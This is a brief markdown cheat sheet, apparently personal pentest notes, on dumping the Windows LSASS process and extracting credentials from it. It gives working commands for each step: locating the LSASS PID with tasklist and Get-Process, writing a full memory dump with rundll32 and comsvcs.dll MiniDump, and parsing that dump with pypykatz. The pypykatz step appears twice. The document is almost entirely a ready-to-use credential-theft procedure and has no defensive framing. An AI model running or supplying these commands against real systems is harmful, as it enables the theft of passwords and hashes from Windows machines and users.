1) dump lsass from task manager if we have UI access for windows
<img width="1024" height="738" alt="image" src="https://github.com/user-attachments/assets/55a6ab30-c50f-4bf7-b8c9-2826714e4268" />

2) Finding LSASS's PID in cmd
```shell
tasklist /svc
```

3) Finding LSASS's PID in PowerShell
```shell
Get-Process lsass
```

4) Creating a dump file using PowerShell
```shell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

5) Using Pypykatz to extract credentials
```shell
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

6) Using Pypykatz to extract credentials
```shell
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
